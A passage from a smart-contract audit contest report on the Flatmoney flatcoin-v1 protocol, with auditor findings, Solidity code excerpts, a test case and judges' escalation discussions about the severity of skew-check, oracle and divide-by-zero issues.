I know that 'Historical decisions are no longer considered sources of truth.' , but I believe the comments made by [Evert](https://github.com/sherlock-audit/2023-09-Gitcoin-judging/issues/862#issuecomment-1777391236) and [Czar](https://github.com/sherlock-audit/2023-10-real-wagmi-judging/issues/104#issuecomment-1784859538) was enough to justify the question.

And, this issue cannot be solved by updating deployment script.

**0xjuaan**

> And, this issue cannot be solved by updating deployment script.

It actually can be fixed in the deployment script, by just setting the oracle address to the address of this [contract](https://github.com/dhedge/V2-Public/blob/master/contracts/priceAggregators/ETHCrossAggregator.sol) that was made by the protocol team, and already audited (according to them).

**0xhsp**

> > And, this issue cannot be solved by updating deployment script.
> 
> It actually can be fixed in the deployment script, by just setting the oracle address to the address of this [contract](https://github.com/dhedge/V2-Public/blob/master/contracts/priceAggregators/ETHCrossAggregator.sol) that was made by the protocol team, and already audited (according to them).

Disagree. There is no evidence provided to Watsons in the public domain during the audit contest period (22 Jan to 4 Feb) that states that the protocol team will set the oracle address to the address of this [contract](https://github.com/dhedge/V2-Public/blob/master/contracts/priceAggregators/ETHCrossAggregator.sol) that was made by the protocol team.

**0xjuaan**

@0xhsp yes, that is correct. but the fix to this issue raised would involve a change in the deployment script, which is out of scope.

**0xhsp**

@0xjuaan Since the contract you mentioned is not known during the contest period, the code change should be considered as the only way to mitigate the issue. Otherwise all the valid issue can be invalidated as the affected contracts can be replaced by a new contract.

**0xjuaan**

that's a good point. we will see what judges say

**nevillehuang**

I too have no additional comments to add and stand by my previous [comment here](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/90#issuecomment-1961017870), that this should maintain as medium severity given the whole oracle contract code logic was changed to integrated into the deployment script.

**Czar102**

I'd like to draw a clear line between different types of vulnerabilities.

There are bugs that cause the codebase not to work at all (like mentioned https://github.com/sherlock-audit/2023-10-real-wagmi-judging/issues/104) and these are valid Medium severity issues.

There are also bugs that prevent the contracts from being properly deployed/initialized, and these are considered of Low/Informational severity:
> 7. **Front-running initializers:** Front-running initializers where there is no irreversible damage or loss of funds & the protocol could just redeploy and initialize again is not a valid issue.

I must claim that one needs to slightly extrapolate this rule, and this will be corrected in the rules to be more generalized.

Anyway, for this issue I think there are grounds for invalidation anyway – Chainlink can be asked to introduce an additional feed. They can provide it for a small fee.

Maintaining Sherlock's stance to accept an escalation and invalidate the issue.

**RealLTDingZhen**

Fair enough, I would respect Sherlock's decision.

But I can't understand how `Chainlink can be asked to introduce an additional feed.` could be the reason to invalidate a issue.
Such statement could invalidate most Chainlink-related issues which were regarded M/H😂

**gstoyanovbg**

@Evert0x @Czar102 Reading the comments, I am quite confused by Sherlock's decision. As far as I understand, the main argument for invalidating this report is that the protocol wouldn't be able to get deployed. I disagree with that. The protocol can be deployed with 2 incompatible feeds, as described in the report. This will result in non-functioning core features, which, as mentioned above, fully meets the criteria for a Medium severity issue described by Sherlock. I want to emphasize again that an auditor cannot know what the sponsors think and whether they are aware that their code will not work with the available feeds.

@Czar102 , with all due respect, it takes a great deal of imagination to fit the current report into the definition from point 7. Before submitting this report, I carefully examined the validity criteria several times and found no grounds to invalidate it. It seems that I am not alone, as many other auditors, including the lead judge, have made same conclusion. A new auditor who is not familiar with the way the Sherlock team reasons cannot, based solely on the validity criteria, conclude that the report is not valid. This would not be a problem if there were no penalties for invalid reports, but there are. And it turns out that auditors would be penalized with worsened ratios due to flaws in the validity criteria, which is unfair in my opinion.

If this trend continues, auditors will stop submitting such reports, and at some point it will turn out that some protocol passed the Sherlock audit without problems and at the same time is totally broken.

**Czar102**

@RealLTDingZhen we are focusing on vulnerabilities here, not on technical difficulties of deployment.

@gstoyanovbg deploying with 2 incompatible feeds would be a deployment mistake, and we don't consider that scenario.

**Czar102**

Result:
Low
Has duplicates

Rejecting the second escalation since the first escalation already proposed the correct outcome.

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [securitygrid](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/90/#issuecomment-1956265616): accepted
- [xiaoming9090](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/90/#issuecomment-1959554464): rejected

# Issue M-2: Fees are ignored when checks skew max in Stable Withdrawal /  Leverage Open / Leverage Adjust 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/92 

## Found by 
HSP
## Summary
Fees are ignored when checks skew max in Stable Withdrawal / Leverage Open / Leverage Adjust.

## Vulnerability Detail
When user [withdrawal from the stable LP](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L96-L100), vault **total stable collateral** is updated:
```solidity
        vault.updateStableCollateralTotal(-int256(_amountOut));
```
Then **_withdrawFee** is calculated and [checkSkewMax(...)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L296) function is called to ensure that the system will not be too skewed towards longs:
```solidity
            // Apply the withdraw fee if it's not the final withdrawal.
            _withdrawFee = (stableWithdrawFee * _amountOut) / 1e18;

            // additionalSkew = 0 because withdrawal was already processed above.
            vault.checkSkewMax({additionalSkew: 0});
```
At the end of the execution, vault collateral is settled again with **withdrawFee**, keeper receives **keeperFee** and `(amountOut - totalFee)` amount of collaterals are transferred to the user:
```solidity
        // include the fees here to check for slippage
        amountOut -= totalFee;

        if (amountOut < stableWithdraw.minAmountOut)
            revert FlatcoinErrors.HighSlippage(amountOut, stableWithdraw.minAmountOut);

        // Settle the collateral
        vault.updateStableCollateralTotal(int256(withdrawFee)); // pay the withdrawal fee to stable LPs
        vault.sendCollateral({to: msg.sender, amount: order.keeperFee}); // pay the keeper their fee
        vault.sendCollateral({to: account, amount: amountOut}); // transfer remaining amount to the trader
```
The `totalFee` is composed of keeper fee and withdrawal fee:
```solidity
        uint256 totalFee = order.keeperFee + withdrawFee;
```
This means withdrawal fee is still in the vault, however this fee is ignored when checks skew max and protocol may revert on a safe withdrawal. Consider the following scenario:
1. **skewFractionMax** is `120%` and **stableWithdrawFee** is `1%`;
2. Alice deposits `100` collateral and Bob opens a leverage position with size `100`;
3. At the moment, there is `100` collaterals in the Vault, **skew** is `0` and **skew fraction** is `100%`;
4. Alice tries to withdraw `16.8` collaterals,  **withdrawFee** is `0.168`, after withdrawal, it is expected that there is `83.368` stable collaterals in the Vault, so **skewFraction** should be `119.5%`, which is less than **skewFractionMax**;
5. However, the withdrawal will actually fail because when protocol checks skew max, **withdrawFee** is ignored and the **skewFraction** turns out to be `120.19%`, which is higher than **skewFractionMax**.

The same issue may occur when protocol executes a [leverage open](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L80-L84) and [leverage adjust](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L147-L151), in both executions, **tradeFee**  is ignored when checks skew max.

Please see the test codes:
```solidity
    function test_audit_withdraw_fee_ignored_when_checks_skew_max() public {
        // skewFractionMax is 120%
        uint256 skewFractionMax = vaultProxy.skewFractionMax();
        assertEq(skewFractionMax, 120e16);

        // withdraw fee is 1%
        vm.prank(vaultProxy.owner());
        stableModProxy.setStableWithdrawFee(1e16);

        uint256 collateralPrice = 1000e8;

        uint256 depositAmount = 100e18;
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: depositAmount,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        uint256 additionalSize = 100e18;
        announceAndExecuteLeverageOpen({
            traderAccount: bob,
            keeperAccount: keeper,
            margin: 50e18,
            additionalSize: 100e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // After leverage Open, skew is 0
        int256 skewAfterLeverageOpen = vaultProxy.getCurrentSkew();
        assertEq(skewAfterLeverageOpen, 0);
        // skew fraction is 100%
        uint256 skewFractionAfterLeverageOpen = getLongSkewFraction();
        assertEq(skewFractionAfterLeverageOpen, 1e18);

        // Note: comment out `vault.checkSkewMax({additionalSkew: 0})` and below lines to see the actual skew fraction
        // Alice withdraws 16.8 collateral
        // uint256 aliceLpBalance = stableModProxy.balanceOf(alice);
        // announceAndExecuteWithdraw({
        //     traderAccount: alice, 
        //     keeperAccount: keeper, 
        //     withdrawAmount: 168e17, 
        //     oraclePrice: collateralPrice, 
        //     keeperFeeAmount: 0
        // });

        // // After withdrawal, the actual skew fraction is 119.9%, less than skewFractionMax
        // uint256 skewFactionAfterWithdrawal = getLongSkewFraction();
        // assertEq(skewFactionAfterWithdrawal, 1199501007580846367);

        // console2.log(WETH.balanceOf(address(vaultProxy)));
    }
```

## Impact
Protocol may wrongly prevent a Stable Withdrawal / Leverage Open / Leverage Adjust even if the execution is essentially safe.

## Code Snippet
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L130
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L101
https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L166

## Tool used
Manual Review

## Recommendation
Include withdrawal fee / trade fee when check skew max.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid



**0xLogos**

Escalate 

Low. Exceeding skewFractionMax is possible only by a fraction of a percent 

**sherlock-admin2**

> Escalate 
> 
> Low. Exceeding skewFractionMax is possible only by a fraction of a percent 

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**santipu03**

Agree with @0xLogos. The withdrawal fee is a tiny amount compared to the total deposited collateral, therefore the impact will be almost imperceptible. The severity should be LOW. 

**0xhsp**

This issue is valid.

The fee maybe a tiny amount compared to the total deposited collateral, but **the impact is significant to individual users**.

Let's assume **stableCollateralTotal** is 1000 ether, **stableWithdrawFee** is 1%, **skewFractionMax** is 120% and current **skewFraction** is 60%.

> If withdrawal fee is ignored in the calculation of shew fraction, **withdrawAmount** is calculated as:

<img width="508" alt="1" src="https://github.com/sherlock-audit/2023-12-flatmoney-judging/assets/155340699/45adbabb-49fc-4a0e-9414-ada424ba0091">

> If withdrawal fee is considered in the calculation of shew fraction, **withdrawAmount** is calculated as:

<img width="702" alt="2" src="https://github.com/sherlock-audit/2023-12-flatmoney-judging/assets/155340699/e557c8b9-6bfa-40df-ac20-69bcc955c43f">

We can notice that **5 ether less** collaterals ethers are withdrawable if fee is ignored. Just be realistic, individual user is most likely to deposit a tiny amount of collaterals, this means **many users are unable to withdraw any of their collaterals even if it is safe to do so**.

Similarly, since **tradeFee** is ignored when protocol checks a leverage open/adjustment, **many traders would be wrongly prevented from opening/adjusting any positions**.


**0xLogos**

In first pic after withdrawing for example 300 eth, fee for that amount will be included in the next withdrawal and so forth so eventually all 505 eth can be withdrawn. Note that it's not work around, just how things work in most cases.

**0xhsp**

It's not about how much user can withdraw but if user can withdraw whenever it is safe. 

Given after withdrawing for example 300 eth, users expect to be able to withdraw 353.5 ether more but are only allowed 350 ether due to the issue.

Incorrect checking is a high risk to the protocol, it is difficult to predict how users will operate but it would eventually cause huge impact if we ignore the risk.

**santipu03**

The margin error on the calculation of `checkSkewMax` will be equal to the `tradeFee` on that operation. When the operation is using a huge amount (500 ETH), the margin error of the calculation will be of 5 ETH (assuming a 1% `tradeFee`). But if 10 users withdraw 50 ETH each, the margin error will only be 0.5 ETH on the last withdrawal.

To trigger this issue with a non-trivial margin error, it requires a user that withdraws collateral (or creates or adjusts a position) with a huge amount compared to the total collateral deposited. 

Given the low probability of this issue happening with a non-trivial margin error and the impact being medium/low, I'd consider the overall severity of this issue to be LOW.

**0xhsp**

The probability should be medium as you cannot predict the wild market, the impact can be high since usera may suffer a loss due to price fluncation if they cannot withdraw in time. So it's fair to say the servrity is medium.

**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/280.

**Evert0x**

It seems to me that the issue described can negatively affect users and breaks core contract functionality in specific (but not unrealistic) scenarios https://docs.sherlock.xyz/audits/judging/judging#v.-how-to-identify-a-medium-issue

Tentatively planning to reject the escalation and keep the issue state as is, but will revisit it later. 

**Evert0x**

Planning to continue with my judgment as stated in the comment above. 

**Czar102**

Result:
Medium
Unique

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/92/#issuecomment-1956105454): rejected

# Issue M-3: StableModule.stableCollateralPerShare may return 0 in edge case 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/142 

The protocol has acknowledged this issue.

## Found by 
Bauer, nobody2018, ravikiran.web3
## Summary

[[DelayedOrder.announceStableDeposit](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L67-L71)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L67-L71) will [[call StableModule.stableDepositQuote to calculate quotedAmount](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L80-L81)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L80-L81). If [[StableModule.stableCollateralPerShare](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L208)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L208) returns 0, then tx will be revert due to a divide-by-zero error. Therefore, the short side cannot deposit collateral.

## Vulnerability Detail

```solidity
File: flatcoin-v1\src\DelayedOrder.sol
067:     function announceStableDeposit(
068:         uint256 depositAmount,
069:         uint256 minAmountOut,
070:         uint256 keeperFee
071:     ) external whenNotPaused {
......
080:         uint256 quotedAmount = IStableModule(vault.moduleAddress(FlatcoinModuleKeys._STABLE_MODULE_KEY))
081:->           .stableDepositQuote(depositAmount);
......
102:     }

File: flatcoin-v1\src\StableModule.sol
224:     function stableDepositQuote(uint256 _depositAmount) public view returns (uint256 _amountOut) {
225:->       return (_depositAmount * (10 ** decimals())) / stableCollateralPerShare();
226:     }
```

L225, if `stableCollateralPerShare()` returns 0, a divide-by-zero error will occur.

```solidity
File: flatcoin-v1\src\StableModule.sol
208:     function stableCollateralPerShare(uint32 _maxAge) public view returns (uint256 _collateralPerShare) {
209:         uint256 totalSupply = totalSupply();
210: 
211:         if (totalSupply > 0) {
212:->           uint256 stableBalance = stableCollateralTotalAfterSettlement(_maxAge);
213: 		 //@audit if stableBalance is 0, _collateralPerShare is also 0.
214:->           _collateralPerShare = (stableBalance * (10 ** decimals())) / totalSupply;
215:         } else {
216:             // no shares have been minted yet
217:             _collateralPerShare = 1e18;
218:         }
219:     }
```

Under what circumstances will `stableCollateralTotalAfterSettlement(_maxAge)` return 0?

```solidity
File: flatcoin-v1\src\StableModule.sol
173:     function stableCollateralTotalAfterSettlement(
174:         uint32 _maxAge
175:     ) public view returns (uint256 _stableCollateralBalance) {
176:         // Assumption => pnlTotal = pnlLong + fundingAccruedLong
177:         // The assumption is based on the fact that stable LPs are the counterparty to leverage traders.
178:         // If the `pnlLong` is +ve that means the traders won and the LPs lost between the last funding rate update and now.
179:         // Similary if the `fundingAccruedLong` is +ve that means the market was skewed short-side.
180:         // When we combine these two terms, we get the total profit/loss of the leverage traders.
181:         // NOTE: This function if called after settlement returns only the PnL as funding has already been adjusted
182:         //      due to calling `_settleFundingFees()`. Although this still means `netTotal` includes the funding
183:         //      adjusted long PnL, it might not be clear to the reader of the code.
184:->       int256 netTotal = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY))
185:             .fundingAdjustedLongPnLTotal({maxAge: _maxAge});
186: 
187:         // The flatcoin LPs are the counterparty to the leverage traders.
188:         // So when the traders win, the flatcoin LPs lose and vice versa.
189:         // Therefore we subtract the leverage trader profits and add the losses
190:->       int256 totalAfterSettlement = int256(vault.stableCollateralTotal()) - netTotal;
191: 
192:         if (totalAfterSettlement < 0) {
193:->           _stableCollateralBalance = 0;
194:         } else {
195:             _stableCollateralBalance = uint256(totalAfterSettlement);
196:         }
197:     }
```

As long as `netTotal` calculated by L184 is greater than or equal to `vault.stableCollateralTotal()`, then `_stableCollateralBalance` is 0.

[[LeverageModule.fundingAdjustedLongPnLTotal](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L397-L411)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L397-L411) returns the total profit and loss of all the leverage positions (long side). A positive netTotal means the collateral price pumps, and vice versa. And `vault.stableCollateralTotal()` represents the funds of the short side.

Imagine: if the price of the collateral rises sharply due to the occurrence of an good news, then the long side's `netTotal` is likely to be greater than the short side's `stableCollateralTotal`. In this way, `stableCollateralTotalAfterSettlement` may return 0. This will cause a division by zero error.  
Because the price of collateral rises sharply, the sentiment of short side will increase. However, the short side will be unable to deposit collateral via `DelayedOrder.announceStableDeposit`.

## Impact

If the above situation occurs, the short side will not be able to deposit collateral due to a divide-by-zero error. This is obviously unfair to the short side.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L80-L81

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L212-L214

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/StableModule.sol#L184-L196

## Tool used

Manual Review

## Recommendation

```solidity
File: flatcoin-v1\src\StableModule.sol
208:     function stableCollateralPerShare(uint32 _maxAge) public view returns (uint256 _collateralPerShare) {
209:         uint256 totalSupply = totalSupply();
210: 
211:         if (totalSupply > 0) {
212:             uint256 stableBalance = stableCollateralTotalAfterSettlement(_maxAge);
213:+++          //If stableBalance is 0, special processing is performed so that _collateralPerShare cannot be 0.
214:             _collateralPerShare = (stableBalance * (10 ** decimals())) / totalSupply;
215:         } else {
216:             // no shares have been minted yet
217:             _collateralPerShare = 1e18;
218:         }
219:     }
```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid: no division by zero



**0xLogos**

Escalate

Low, seems like acceptable risk because such situation really unlikely to happen (this basicly means flatcoin has no collateral backed).

**sherlock-admin2**

> Escalate
> 
> Low, seems like acceptable risk because such situation really unlikely to happen (this basicly means flatcoin has no collateral backed).

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**securitygrid**

can't understand what that escalation is saying.

**0xcrunch**

> As long as netTotal calculated by L184 is greater than or equal to vault.stableCollateralTotal(), then _stableCollateralBalance is 0.

> Imagine: if the price of the collateral rises sharply due to the occurrence of an good news, then the long side's netTotal is likely to be greater than the short side's stableCollateralTotal. In this way, stableCollateralTotalAfterSettlement may return 0. This will cause a division by zero error.

This is essentially  the known issue in the README:
> Flatcoin can be net short and ETH goes up 5x in a short period of time, potentially leading to UNIT going to 0.
The flatcoin holders should be mostly delta neutral, but they may be up to 20% short in certain market conditions (skewFractionMax parameter).
The funding rate should balance this out, but theoretically, if ETH price increases by 5x in a short period of time whilst the flatcoin holders are 20% short, it's possible for flatcoin value to go to 0. This scenario is deemed to be extremely unlikely and the funding rate is able to move quickly enough to bring the flatcoin holders back to delta neutral.

**Evert0x**

Planning to accept the escalation and invalidate the report as it's describing a known issue/acceptable risk described in the README @securitygrid 

**securitygrid**

Agree 

**Evert0x**

Result:
Invalid
Has Duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/142/#issuecomment-1956162561): accepted

# Issue M-4: In LeverageModule.executeOpen/executeAdjust, vault.checkSkewMax should be called after updating the global position data 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/143 

## Found by 
ge6a, jennifer37, nobody2018, santipu\_
## Summary

[[checkSkewMax](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L296)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L296) is used to assert that the system will not be too skewed towards longs after additional skew is added. However, the `stableCollateralTotal` used by this function is a variable that will [[be updated by updateGlobalPositionData](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L205)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L205). Therefore, `checkSkewMax` should be executed after `updateGlobalPositionData`. Otherwise, there is no guarantee whether newly opened positions will make the system more skew towards long side.

## Vulnerability Detail

```solidity
File: flatcoin-v1\src\LeverageModule.sol
080:     function executeOpen(
081:         address _account,
082:         address _keeper,
083:         FlatcoinStructs.Order calldata _order
084:     ) external whenNotPaused onlyAuthorizedModule returns (uint256 _newTokenId) {
......
101:->       vault.checkSkewMax({additionalSkew: announcedOpen.additionalSize});
102: 
103:         {
104:             // The margin change is equal to funding fees accrued to longs and the margin deposited by the trader.
105:->           vault.updateGlobalPositionData({
106:                 price: entryPrice,
107:                 marginDelta: int256(announcedOpen.margin),
108:                 additionalSizeDelta: int256(announcedOpen.additionalSize)
109:             });
......
140:     }
```

L101, [[vault.checkSkewMax](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L296-L307)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L296-L307) internally calculates `longSkewFraction` by the formula `((_globalPositions.sizeOpenedTotal + _additionalSkew) * 1e18) / stableCollateralTotal`. This function guarantees that `longSkewFraction` will not exceed `skewFractionMax` ([[120%](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/scripts/deployment/configs/FlatcoinVault.config.js#L9)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/scripts/deployment/configs/FlatcoinVault.config.js#L9)).

However, `stableCollateralTotal` will [[be updated in updateGlobalPositionData](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L205)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L205).

- When `profitLossTotal` is positive value, then `stableCollateralTotal` will decrease.
- When `profitLossTotal` is negative value, then `stableCollateralTotal` will increase.

Assume the following:

```data
stableCollateralTotal = 90e18
_globalPositions = {  
    sizeOpenedTotal: 100e18,  
    lastPrice: 1800e18,  
}
A new position is to be opened with additionalSize = 5e18.  
fresh price=2000e18
```

We explain it in two situations:

1. `checkSkewMax` is called before `updateGlobalPositionData`.

```data
longSkewFraction = (_globalPositions.sizeOpenedTotal + additionalSize) * 1e18 / stableCollateralTotal 
                 = (100e18 + 5e18) * 1e18 / 90e18 
                 = 1.16667e18 < skewFractionMax(1.2e18)
so checkSkewMax will be passed.
```

2. `checkSkewMax` is called after `updateGlobalPositionData`.

```data
In updateGlobalPositionData:  
PerpMath._profitLossTotal calculates
profitLossTotal = _globalPositions.sizeOpenedTotal * (int256(price) - int256(globalPosition.lastPrice)) / int256(price) 
                = 100e18 * (2000e18 - 1800e18) / 2000e18 = 100e18 * 200e18 /2000e18 
                = 10e18 
_updateStableCollateralTotal(-profitLossTotal) will deduct 10e18 from stableCollateralTotal. 
so stableCollateralTotal = 90e18 - 10e18 = 80e18.  

Now, checkSkewMax is called:  
longSkewFraction = (_globalPositions.sizeOpenedTotal + additionalSize) * 1e18 / stableCollateralTotal 
                 = (100e18 + 5e18) * 1e18 / 80e18 
                 = 1.3125e18 > skewFractionMax(1.2e18)
```

Therefore, **this new position should not be allowed to open, as this will only make the system more skewed towards the long side**.

## Impact

The `stableCollateralTotal` used by `checkSkewMax` is the value of the total profit that has not yet been settled, which is old value. In this way, when the price of collateral rises, it will cause the system to be more skewed towards the long side.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L101-L109

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L166

## Tool used

Manual Review

## Recommendation

```solidity
File: flatcoin-v1\src\LeverageModule.sol
080:     function executeOpen(
081:         address _account,
082:         address _keeper,
083:         FlatcoinStructs.Order calldata _order
084:     ) external whenNotPaused onlyAuthorizedModule returns (uint256 _newTokenId) {
......
101:---      vault.checkSkewMax({additionalSkew: announcedOpen.additionalSize});
102: 
103:         {
104:             // The margin change is equal to funding fees accrued to longs and the margin deposited by the trader.
105:             vault.updateGlobalPositionData({
106:                 price: entryPrice,
107:                 marginDelta: int256(announcedOpen.margin),
108:                 additionalSizeDelta: int256(announcedOpen.additionalSize)
109:             });
+++              vault.checkSkewMax(0); //0 means that vault.updateGlobalPositionData has added announcedOpen.additionalSize.
......
140:     }
```

Also, if `announcedAdjust.additionalSizeAdjustment` is greater than 0 in [[executeAdjust](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L166)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LeverageModule.sol#L166), similar fix is required.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: checkSkewMax should be adjusted; medium(6)



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/266.

**itsermin**

Resolved here: https://github.com/dhedge/flatcoin-v1/pull/266
Because collateral is no longer settled in `updateGlobalPositionData`

# Issue M-5: In executeOrder, OracleModule.getPrice(maxAge) may revert because maxAge is too small 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/170 

The protocol has acknowledged this issue.

## Found by 
Dliteofficial, nobody2018
## Summary

[[executeOrder](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L378-L381)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L378-L381) will call different functions to process the order according to the type of order, and these functions will call `OracleModule.getPrice(maxAge)` to get the price. `maxAge` is equal to the current `block.timestamp - order.executableAtTime`. If `maxAge` is too small (for example, 0-3), then `OracleModule.getPrice(maxAge)` may revert [[here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L132)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L132) even though the price is fresh.

## Vulnerability Detail

Below we use the `LeverageAdjust` type Order to describe this issue.

```data
minExecutabilityAge is 5s  
maxExecutabilityAge is 60s
```

1.  Alice deposits margin on her position A via `DelayedOrder.announceLeverageAdjust`. Because if the price of the collateral continues to dump, position A will be liquidated. A pending `LeverageAdjust` order is created. Assume `block.timestamp = 1707000000`, so `order.executableAtTime = block.timestamp + minExecutabilityAge = 1707000005`. The expiration time of this order is `order.executableAtTime + maxExecutabilityAge = 1707000065`.
2.  The order has `keeperFee` paid to the keeper, so the keepers will compete with each other as long as there is an order that can be executed. One keeper monitored the `FlatcoinEvents.OrderAnnounced` event, it requested the API to obtain `priceUpdateData`. Assume that the fresh price's `publishTime` is 1707000003.
3.  After minExecutabilityAge seconds (block.timestamp=1707000005), the keeper executes the order via `DelayedOrder.executeOrder`. The `priceUpdateData` argument is obtained in step 2. Eventually tx will revert.

Let’s analyze the reasons for revert. The call stack of [[DelayedOrder.executeOrder](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L378-L381)](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L378-L381) is as follows:

```flow
DelayedOrder.executeOrder
  //This modifer will write priceUpdatedata to pyth oracle. Note: priceUpdatedata is from step 2
  updatePythPrice(vault, msg.sender, priceUpdateData)
    vault.settleFundingFees()
    _executeLeverageAdjust(account)
      //here checking whether order can be executed
      _prepareExecutionOrder(account, order.executableAtTime)
      LeverageModule.executeAdjust
L152    uint32 maxAge = _getMaxAge(_order.executableAtTime);
L159    (uint256 adjustPrice, ) = IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).getPrice({
            maxAge: maxAge
        });
        ......
      ......
    ......
  ......
```

L152, `maxAge = block.timestamp - _order.executableAtTime = 1707000005 - 1707000005 = 0`

L159, the `maxAge` argument passed into `OracleModule.getPrice` is 0.

```solidity
File: flatcoin-v1\src\OracleModule.sol
094:     function getPrice(uint32 maxAge) public view returns (uint256 price, uint256 timestamp) {
095:->       (price, timestamp) = _getPrice(maxAge);
096:     }

106:     function _getPrice(uint32 maxAge) internal view returns (uint256 price, uint256 timestamp) {
107:->       (uint256 onchainPrice, uint256 onchainTime) = _getOnchainPrice(); // will revert if invalid
108:->       (uint256 offchainPrice, uint256 offchainTime, bool offchainInvalid) = _getOffchainPrice();
109:         bool offchain;
110: 
111:         uint256 priceDiff = (int256(onchainPrice) - int256(offchainPrice)).abs();
112:         uint256 diffPercent = (priceDiff * 1e18) / onchainPrice;
113:         if (diffPercent > maxDiffPercent) revert FlatcoinErrors.PriceMismatch(diffPercent);
114: 
115:         if (offchainInvalid == false) {
116:             // return the freshest price
117:             if (offchainTime >= onchainTime) {
118:                 price = offchainPrice;
119:                 timestamp = offchainTime;
120:                 offchain = true;
121:             } else {
122:                 price = onchainPrice;
123:                 timestamp = onchainTime;
124:             }
125:         } else {
126:             price = onchainPrice;
127:             timestamp = onchainTime;
128:         }
129: 
130:         // Check that the timestamp is within the required age
131:->       if (maxAge < type(uint32).max && timestamp + maxAge < block.timestamp) {
